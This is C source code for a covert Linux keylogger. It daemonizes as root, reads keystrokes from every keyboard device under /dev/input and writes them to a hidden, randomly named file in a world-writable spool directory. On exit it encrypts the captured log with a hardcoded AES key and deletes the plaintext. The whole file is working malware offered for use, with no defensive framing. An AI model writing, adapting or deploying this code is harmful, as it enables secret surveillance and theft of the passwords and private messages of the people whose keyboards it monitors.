#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <sys/epoll.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>


#define LOG_DIR          "/var/spool/samba" // change to your directory. This is writeble by default from any users.
#define FILENAME_PATTERN ".tmp_%06u"
#define KEY_HEX_STR      "4a8d2b30afc617d6f91843ded1f0d014" // change this to your key
#define KEY_BYTES        16
#define test_bit(bit, array) ((array)[(bit)/8] & (1 << ((bit)%8)))

static volatile sig_atomic_t running = 1;
static FILE *log_fp = NULL;
static char log_path[256] = {0};

static int shift_pressed = 0;    // left or right shift
static int caps_lock = 0;        // caps lock state

static void daemonize(void) {
	pid_t pid = fork();
	if (pid < 0) {
		perror("fork");
		exit(EXIT_FAILURE);
	}
	if (pid > 0) {
		exit(EXIT_SUCCESS); // we are parent
	}

	if (setsid() < 0) {
		perror("setsid");
		exit(EXIT_FAILURE); // hmmm?
	}

	signal(SIGCHLD, SIG_IGN);
	signal(SIGHUP, SIG_IGN);

	pid = fork();
	if (pid < 0) {
		perror("fork2");
		exit(EXIT_FAILURE);
	}
	if (pid > 0) exit(EXIT_SUCCESS);

	if (chdir("/") < 0) {
		perror("chdir");
		exit(EXIT_FAILURE);
	}

	umask(0);

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);
	open("/dev/null", O_RDWR);
	dup(0);
	dup(0);
}

static unsigned int get_random_6digit(void) {
	unsigned int r;
	int fd = open("/dev/urandom", O_RDONLY);
	if (fd < 0) {
		perror("open /dev/urandom");
		exit(EXIT_FAILURE);
	}
	if (read(fd, &r, sizeof(r)) != sizeof(r)) {
		perror("read /dev/urandom");
		close(fd);
		exit(EXIT_FAILURE);
	}
	close(fd);
	return r % 1000000;
}

static void ensure_log_dir(void) {
	struct stat st;
	if (stat(LOG_DIR, &st) == 0) {
		if (!S_ISDIR(st.st_mode)) {
			fprintf(stderr, "%s exists but is not a directory\n", LOG_DIR);
			exit(EXIT_FAILURE);
		}
	} else {
		if (mkdir(LOG_DIR, 0755) != 0) {
			perror("mkdir");
			exit(EXIT_FAILURE);
		}
	}
}

static void open_log_file(void) {
	ensure_log_dir();
	unsigned int rnd = get_random_6digit();
	snprintf(log_path, sizeof(log_path), "%s/" FILENAME_PATTERN, LOG_DIR, rnd);
	log_fp = fopen(log_path, "a");
	if (!log_fp) {
		perror("fopen log file");
		exit(EXIT_FAILURE);
	}
	setvbuf(log_fp, NULL, _IOLBF, 0);
}

static int hex2bin(const char *hex, unsigned char *bin, size_t bin_len) {
	size_t len = strlen(hex);
	if (len != bin_len * 2) return -1;
	for (size_t i = 0; i < bin_len; i++) {
		unsigned int byte;
		if (sscanf(hex + 2*i, "%02x", &byte) != 1) return -1;
		bin[i] = (unsigned char)byte;
	}
	return 0;
}

static void encrypt_file(const char *inpath, const unsigned char *key, size_t key_len) {
	FILE *in = fopen(inpath, "rb");
	if (!in) {
		perror("fopen input for encryption");
		return;
	}

	char outpath[512];
	snprintf(outpath, sizeof(outpath), "%s.bin", inpath);
	FILE *out = fopen(outpath, "wb");
	if (!out) {
		perror("fopen output for encryption");
		fclose(in);
		return;
	}

	unsigned char iv[16];
	if (RAND_bytes(iv, sizeof(iv)) != 1) {
		fprintf(stderr, "RAND_bytes failed\n");
		fclose(in);
		fclose(out);
		unlink(outpath);
		return;
	}

	if (fwrite(iv, 1, sizeof(iv), out) != sizeof(iv)) {
		perror("fwrite IV");
		fclose(in);
		fclose(out);
		unlink(outpath);
		return;
	}

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	if (!ctx) {
		perror("EVP_CIPHER_CTX_new");
		fclose(in);
		fclose(out);
		unlink(outpath);
		return;
	}

	if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
		fprintf(stderr, "EVP_EncryptInit_ex failed\n");
		EVP_CIPHER_CTX_free(ctx);
		fclose(in);
		fclose(out);
		unlink(outpath);
		return;
	}

	unsigned char inbuf[4096];
	unsigned char outbuf[4096 + EVP_CIPHER_CTX_block_size(ctx)];
	int inlen, outlen;

	while ((inlen = fread(inbuf, 1, sizeof(inbuf), in)) > 0) {
		if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen) != 1) {
			fprintf(stderr, "EVP_EncryptUpdate failed\n");
			fclose(in);
			fclose(out);
			unlink(outpath);
			EVP_CIPHER_CTX_free(ctx);
			return;
		}
		if (fwrite(outbuf, 1, outlen, out) != (size_t)outlen) {
			perror("fwrite ciphertext");
			fclose(in);
			fclose(out);
			unlink(outpath);
			EVP_CIPHER_CTX_free(ctx);
			return;
		}
	}

	if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
		fprintf(stderr, "EVP_EncryptFinal_ex failed\n");
		fclose(in);
		fclose(out);
		unlink(outpath);
		EVP_CIPHER_CTX_free(ctx);
		return;
	}
	if (fwrite(outbuf, 1, outlen, out) != (size_t)outlen) {
		perror("fwrite final block");
		fclose(in);
		fclose(out);
		unlink(outpath);
		EVP_CIPHER_CTX_free(ctx);
		return;
	}

	fclose(in);
	fclose(out);
	EVP_CIPHER_CTX_free(ctx);

	if (unlink(inpath) != 0) {
		perror("unlink original log file");
	} else {
		printf("Encrypted %s -> %s\n", inpath, outpath);
	}
}


static int is_keyboard_device(int fd) {
	unsigned char key_bits[KEY_MAX/8 + 1];
	memset(key_bits, 0, sizeof(key_bits));
	if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(key_bits)), key_bits) < 0)
		return 0;
	return (test_bit(KEY_A, key_bits) || test_bit(KEY_ENTER, key_bits) ||
			test_bit(KEY_SPACE, key_bits));
}
static const char* cap2rts(unsigned int code, int shift, int caps) {
	static char buf[32];
	static const struct { unsigned int code; char lower; char upper; } letter_map[] = {
		{KEY_Q, 'q', 'Q'}, {KEY_W, 'w', 'W'}, {KEY_E, 'e', 'E'}, {KEY_R, 'r', 'R'},
		{KEY_T, 't', 'T'}, {KEY_Y, 'y', 'Y'}, {KEY_U, 'u', 'U'}, {KEY_I, 'i', 'I'},
		{KEY_O, 'o', 'O'}, {KEY_P, 'p', 'P'}, {KEY_A, 'a', 'A'}, {KEY_S, 's', 'S'},
		{KEY_D, 'd', 'D'}, {KEY_F, 'f', 'F'}, {KEY_G, 'g', 'G'}, {KEY_H, 'h', 'H'},
		{KEY_J, 'j', 'J'}, {KEY_K, 'k', 'K'}, {KEY_L, 'l', 'L'}, {KEY_Z, 'z', 'Z'},
		{KEY_X, 'x', 'X'}, {KEY_C, 'c', 'C'}, {KEY_V, 'v', 'V'}, {KEY_B, 'b', 'B'},
		{KEY_N, 'n', 'N'}, {KEY_M, 'm', 'M'}
	};
	for (size_t i = 0; i < sizeof(letter_map)/sizeof(letter_map[0]); i++) {
		if (code == letter_map[i].code) {
			char c = (shift ^ caps) ? letter_map[i].upper : letter_map[i].lower;
			buf[0] = c;
			buf[1] = '\0';
			return buf;
		}
	}
	if (code >= KEY_1 && code <= KEY_0) {
		static const char digits[] = "1234567890";
		static const char shifted[] = "!@#$%^&*()";
		int idx = code - KEY_1;
		buf[0] = shift ? shifted[idx] : digits[idx];
		buf[1] = '\0';
		return buf;
	}

	static const struct { unsigned int code; char normal; char shifted; } punct_map[] = {
		{KEY_GRAVE,   '`', '~'},
		{KEY_MINUS,   '-', '_'},
		{KEY_EQUAL,   '=', '+'},
		{KEY_LEFTBRACE,  '[', '{'},
		{KEY_RIGHTBRACE, ']', '}'},
		{KEY_BACKSLASH,  '\\', '|'},
		{KEY_SEMICOLON,  ';', ':'},
		{KEY_APOSTROPHE, '\'', '"'},
		{KEY_COMMA,   ',', '<'},
		{KEY_DOT,     '.', '>'},
		{KEY_SLASH,   '/', '?'}
	};
	for (size_t i = 0; i < sizeof(punct_map)/sizeof(punct_map[0]); i++) {
		if (code == punct_map[i].code) {
			buf[0] = shift ? punct_map[i].shifted : punct_map[i].normal;
			buf[1] = '\0';
			return buf;
		}
	}

	static const struct { unsigned int code; const char *normal; const char *shifted; } keypad_map[] = {
		{KEY_KPSLASH,   "/", "/"}, 
		{KEY_KPASTERISK, "*", "*"},
		{KEY_KPMINUS,   "-", "-"},
		{KEY_KPPLUS,    "+", "+"},
		{KEY_KPENTER,   "Enter (kp)", "Enter (kp)"},
		{KEY_KPDOT,     ".", "."},
		{KEY_KP0,       "0", "0"}, {KEY_KP1, "1", "1"}, {KEY_KP2, "2", "2"},
		{KEY_KP3,       "3", "3"}, {KEY_KP4, "4", "4"}, {KEY_KP5, "5", "5"},
		{KEY_KP6,       "6", "6"}, {KEY_KP7, "7", "7"}, {KEY_KP8, "8", "8"},
		{KEY_KP9,       "9", "9"}
	};
	for (size_t i = 0; i < sizeof(keypad_map)/sizeof(keypad_map[0]); i++) {
		if (code == keypad_map[i].code) {
			const char *s = shift ? keypad_map[i].shifted : keypad_map[i].normal;
			snprintf(buf, sizeof(buf), "%s", s);
			return buf;
		}
	}

	switch (code) {
		case KEY_SPACE:      return " ";
		case KEY_ENTER:      return "Enter";
		case KEY_TAB:        return "Tab";
		case KEY_BACKSPACE:  return "Backspace";
		case KEY_ESC:        return "Escape";
		case KEY_DELETE:     return "Delete";
		case KEY_UP:         return "Up";
		case KEY_DOWN:       return "Down";
		case KEY_LEFT:       return "Left";
		case KEY_RIGHT:      return "Right";
		case KEY_HOME:       return "Home";
		case KEY_END:        return "End";
		case KEY_PAGEUP:     return "PageUp";
		case KEY_PAGEDOWN:   return "PageDown";
		case KEY_INSERT:     return "Insert";
		case KEY_CAPSLOCK:   return "CapsLock";
		case KEY_LEFTSHIFT:
		case KEY_RIGHTSHIFT: return "Shift";
		case KEY_LEFTCTRL:
		case KEY_RIGHTCTRL:  return "Ctrl";
		case KEY_LEFTALT:
		case KEY_RIGHTALT:   return "Alt";
		case KEY_LEFTMETA:
		case KEY_RIGHTMETA:  return "Meta";
		case KEY_SYSRQ:      return "PrintScreen";
		case KEY_SCROLLLOCK: return "ScrollLock";
		case KEY_PAUSE:      return "Pause";
		case KEY_NUMLOCK:    return "NumLock";
		default:
			snprintf(buf, sizeof(buf), "Key(%u)", code);
			return buf;
	}
}
static void process_key_event(const struct input_event *ev) {
	if (ev->type != EV_KEY) return;

	if (ev->code == KEY_LEFTSHIFT || ev->code == KEY_RIGHTSHIFT) {
		if (ev->value == 1) shift_pressed = 1;
		else if (ev->value == 0) shift_pressed = 0;
	}

	if (ev->code == KEY_CAPSLOCK && ev->value == 1) {
		caps_lock = !caps_lock;
	}

	if (ev->value != 1) return;

	struct timeval tv;
	gettimeofday(&tv, NULL);
	struct tm *tm = localtime(&tv.tv_sec);
	char time_str[64];
	strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm);

	const char *key_str = cap2rts(ev->code, shift_pressed, caps_lock);

	// fprintf(log_fp, "%s.%03ld: %s\n", time_str, tv.tv_usec / 1000, key_str); // to make timespamped captures.
	fprintf(log_fp, "%s", key_str);
	fflush(log_fp);
}

static void handle_signal(int sig) {
	(void)sig;
	running = 0;
}
int main(int argc, char **argv) {
	if (geteuid() != 0) {
		fprintf(stderr, "This program must be run as root.\n");
		exit(EXIT_FAILURE);
	}

	daemonize();
	open_log_file();

	OpenSSL_add_all_algorithms();
	ERR_load_crypto_strings();

	int epoll_fd = epoll_create1(0);
	if (epoll_fd < 0) {
		perror("epoll_create1");
		exit(EXIT_FAILURE);
	}

	DIR *dir = opendir("/dev/input");
	if (!dir) {
		perror("opendir /dev/input");
		exit(EXIT_FAILURE);
	}

	struct dirent *entry;
	while ((entry = readdir(dir)) != NULL) {
		if (strncmp(entry->d_name, "event", 5) != 0)
			continue;
		char path[64];
		snprintf(path, sizeof(path), "/dev/input/%s", entry->d_name);
		int fd = open(path, O_RDONLY | O_NONBLOCK);
		if (fd < 0) {
			perror("open device");
			continue;
		}
		if (is_keyboard_device(fd)) {
			struct epoll_event ev;
			ev.events = EPOLLIN;
			ev.data.fd = fd;
			if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
				perror("epoll_ctl add");
				close(fd);
			}
		} else {
			close(fd);
		}
	}
	closedir(dir);
	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = handle_signal;
	sigaction(SIGTERM, &sa, NULL);
	sigaction(SIGINT, &sa, NULL);

	struct epoll_event events[64];
	while (running) {
		int nfds = epoll_wait(epoll_fd, events, 64, -1);
		if (nfds < 0) {
			if (errno == EINTR) continue;
			perror("epoll_wait");
			break;
		}
		for (int i = 0; i < nfds; i++) {
			struct input_event ev;
			ssize_t r = read(events[i].data.fd, &ev, sizeof(ev));
			if (r == sizeof(ev)) {
				process_key_event(&ev);
			} else if (r < 0 && errno != EAGAIN) {
				perror("read");
			}
		}
	}

	for (int i = 0; i < 64; i++) {
		if (events[i].data.fd) close(events[i].data.fd);
	}
	close(epoll_fd);

	// Encrypt the log file on shutdown or TERM
	if (log_fp) {
		fclose(log_fp);
		log_fp = NULL;
	}
	if (log_path[0]) {
		unsigned char key[KEY_BYTES];
		if (hex2bin(KEY_HEX_STR, key, KEY_BYTES) == 0) {
			encrypt_file(log_path, key, KEY_BYTES);
		} else {
			fprintf(stderr, "Invalid hex key\n");
		}
	}

	return 0;
}
